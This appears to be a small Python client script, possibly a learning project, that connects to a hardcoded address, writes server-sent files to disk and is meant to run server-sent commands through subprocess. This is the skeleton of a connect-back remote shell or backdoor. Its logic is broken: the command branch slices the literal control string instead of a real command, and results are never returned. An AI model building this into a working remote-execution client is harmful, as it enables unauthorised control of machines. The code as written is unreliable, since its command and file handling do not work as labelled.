import socket
import subprocess
import random 
from termcolor import *

def receive_file(client_socket):
    i = random.randint(1,100)
    with open(f'file_{i}', 'wb') as file:
        while True:
            data = client_socket.recv(1024)
            if data == b'End of File Transfer':
                break
            file.write(data)

def exec_(conn_):
    while True:
        data = conn_.recv(1024).decode()
        if data == 'FILE TRANSFER':
            print(colored(f"Receiving File '{data[5:]}'",'light_green',attrs=['bold']))
            receive_file(conn_)    
        elif data == 'CMD EXEC':
            cmd = data[4:]
            result = subprocess.getoutput(cmd)
            print(colored(f'Command Executed Sucessfully','green'))
        elif data == 'Connection has been closed':
            print(colored(f'Connection Closed Successfully','red'))
        else:
            print(colored(f'Server: {data}','yellow'))
        msg = input("Enter Message to send back: ")
        conn_.send(msg.encode())

def main():
    sock = socket.socket()
    sock.connect(('172.26.32.1', 8888))
    print(colored(f"Connected to the server successfully.",'light_blue'))

    exec_(sock)
    
    
    sock.close()

if __name__ == "__main__":
    main()
